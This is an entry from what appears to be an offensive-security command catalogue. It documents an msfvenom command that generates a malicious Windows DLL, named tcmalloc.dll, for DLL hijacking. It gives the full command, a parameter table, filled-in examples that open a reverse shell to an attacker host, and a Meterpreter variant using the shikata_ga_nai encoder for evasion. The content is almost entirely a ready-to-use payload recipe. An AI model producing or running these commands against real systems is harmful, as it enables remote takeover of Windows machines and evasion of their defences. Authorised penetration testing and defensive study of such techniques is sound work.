---
id: cmd-msfvenom-dll-001
data: >-
  msfvenom -p windows/shell_reverse_tcp LHOST=[Attacker-IP]
  LPORT=[Attacker-port] -f dll > tcmalloc.dll
tags:
  - payload
  - msfvenom
  - dll
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.619Z'
verified: false
validated: true
submitted: true
---
# msfvenom-generate-dll-payload

## Command

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[Attacker-IP] LPORT=[Attacker-port] -f dll > tcmalloc.dll
```

## Description

This command uses msfvenom to generate a malicious Windows DLL containing a reverse TCP shell payload. It is used in DLL hijacking exploits to create a drop-in replacement for a legitimate DLL like tcmalloc.dll, which executes the shell upon loading by a target process.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-p` | Specifies the payload type (windows/shell_reverse_tcp for reverse shell) | Yes |
| `LHOST` | Attacker's IP address for the reverse connection | Yes |
| `LPORT` | Attacker's listening port | Yes |
| `-f` | Output format (dll for Dynamic Link Library) | Yes |
| `> tcmalloc.dll` | Redirects binary output to the named DLL file | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll > tcmalloc.dll
```

### Advanced Usage

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -e x86/shikata_ga_nai > tcmalloc.dll
```

(Uses Meterpreter and encoder for evasion.)

## Expected Output

Console shows payload generation progress (e.g., 'Found X compatible encoders'), followed by creation of tcmalloc.dll binary file. No shell output; verify with `ls -la tcmalloc.dll` (size ~20-50KB). The DLL embeds shellcode that spawns a reverse shell on load.

## Related

- [[Related Procedure: Generate-Malicious-DLL-with-msfvenom]]
